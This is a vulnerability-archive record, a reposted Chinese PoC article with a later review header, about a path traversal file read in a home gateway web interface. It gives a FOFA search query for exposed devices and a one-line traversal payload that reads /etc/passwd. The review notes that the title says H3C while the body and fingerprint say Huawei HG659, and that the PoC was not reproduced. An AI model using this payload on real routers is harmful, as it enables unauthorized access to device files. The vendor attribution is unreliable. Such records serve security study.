---
source: "MrWQ/vulnerability-paper"
id: "vw-a7be90e6f8e867406644e89c"
entity_id: "ve-a7be90e6f8e867406644e89c"
schema_version: "1"
title: "H3C HG659 lib 任意文件读取漏洞"
product: "Huawei HG659（正文与指纹）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无固件/认证说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/H3C/H3C%20HG659%20lib%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/SQGnMXYJADEqTZpRE69vHg"
source_status: "recorded"
---

# H3C HG659 lib 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Huawei HG659（正文与指纹）
- 本文讨论：lib路径遍历读取
- 版本、权限与配置前提：无固件/认证说明
- 资料类型：短PoC转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题/影响写H3C，正文HUAWEI且FOFA为Huawei HG659，产品归属冲突
- 无修复版本及一手公告，结果只截图

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 厂商/固件、路径规范化及图片结果待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SQGnMXYJADEqTZpRE69vHg)

![](../../.resource/remote/e2d4a13e58aaec619b1f14de57af61649ad7cc27919ffa8d0f6869164bc2deca.jpg)

**![](../../.resource/remote/62ec45fc20ac500854a811a22154a8a90a49ed2e322f774d1e88a948bb94d039.png)**

**一****：漏洞描述🐑**

**HUAWEI HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件**

**二:  漏洞影响🐇**

**H3C HG659**

**三:  漏洞复现🐋**

```
app="HUAWEI-Home-Gateway-HG659"
```

**登录页面如下**

![](../../.resource/remote/7ba027fe3d80db92c987222218565e923f7088d8289570d5e093e9649211848c.png)

**POC 如下**  

```
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![](../../.resource/remote/f524bba90a1f10ac374b608d2386ccd115f31427854a1869fed3b842608819f9.png)

 ****四:  关于文库🦉****

![](../../.resource/remote/2b46ddb897fd91945918752c16042c85b597a5fc746b1317d83e6f15a55d8852.png)

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](../../.resource/remote/b429b9cbd75e2cfd9120725a6fe2e76b51d832d671e09e333c40dae5e398356c.png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](../../.resource/remote/ccb7bc5ce7b30b8f99bdeba963cbbbc47267f787b2b78c5fe58adfbaa5f5a97c.png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
